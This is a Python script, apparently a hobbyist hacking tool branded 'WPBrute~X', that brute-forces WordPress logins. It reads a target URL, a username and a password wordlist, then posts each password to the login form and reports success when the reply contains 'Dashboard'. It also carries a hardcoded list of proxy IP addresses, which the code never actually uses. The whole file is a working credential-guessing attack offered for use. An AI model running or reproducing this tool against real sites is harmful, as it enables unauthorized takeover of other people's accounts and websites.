import os
import sys
import random
import requests, re
R = '\033[31m'   # Red
N = '\033[1;37m' # White
G = '\033[32m'   # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' # Blue
C = '\033[36m' # cyan
def banner():
	print ("""
\033[1;34m
 _______ ______    _________
        |              
       / \
      / _ \
     |.o '.|
     |'._.'|
     |     |
   ,'|  |  |`.
  /  |  |  |  \
  |,-'--|--'-.| l42

Codename : \033[32mWPBrute~X
\033[1;34mCoded BY : \033[32mKyuRazz ~ Family Attack Cyber
\033[1;34mVersion  : \033[32m1.0
Thanks To : Dann ~ Aalex ~ Faisal ~ Ago Oeng 

    """)

class a:

	def __init__(self):
		self.username = input("  [\033[36m*\033[32m] Username => ")
		self.password = input("  [\033[36m*\033[32m] File Password => ")
		self.code = ('jtc')
		self.url = input("  [\033[36m*\033[32m] Your URL => ")
		self.headers = {'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414',
					   'Accept': 'application/x-www-form-urlencoded',
					   'Cookie': 'wordpress_test_cookie=WP Cookie check'

					   }
		
		self.proxi = [
'http://78.160.160.70',
'http://95.239.10.204',
'http://205.202.42.230',
'http://186.148.168.91',
'http://113.252.222.73',
'http://203.107.135.125',
'http://80.48.119.28',
'http://159.203.20.110',
'http://178.128.153.253',
'http://104.248.123.136',
'http://157.230.149.54'

   
]

	def brute(self):
		self.nani = open(self.password, 'r').readlines()
		self.reks1 = open(self.password, 'r').readlines()
		self.testing = requests.get(self.url).text
		self.random = random.choice(self.proxi)
		ha = {'http':self.random}
		try:
			if 'Hover or click the text box below' in self.testing:
				print ("  [\033[36m*\033[32m] ADA PERTANYAAN GAN [\033[36m*\033[32m]")
				for i in self.nani:
					yeah = i.strip()
					self.datadata = {'log':self.username,'pwd':yeah,'reference':self.code}
					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
					hetset = (jebol).text
					if 'Dashboard' in hetset:
						print("\033[32m[SUKSES] {}" .format(yeah))
					else:
						print("\033[GAGAL] [31m{}" .format(yeah))
			else:
				print("  [\033[36m*\033[32m] NO ANSWER [\033[36m*\033[32m]")
				for z in self.reks1:
					yeahmen = z.strip()
					self.datadata = {'log':self.username,'pwd':yeahmen}
					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
					reks2 = (jebol).text
					if 'Dashboard' in reks2:
						print("\033[32m[SUKSES] \033[32m{} ".format(yeahmen))
					else:
						print("\033[31m[GAGAL] {}" .format(yeahmen) )

		except KeyboardInterrupt:
			print ("CTRL+C")





		

if __name__ == "__main__":
	os.system('clear')
	banner()
	mi = a()
	mi.brute()
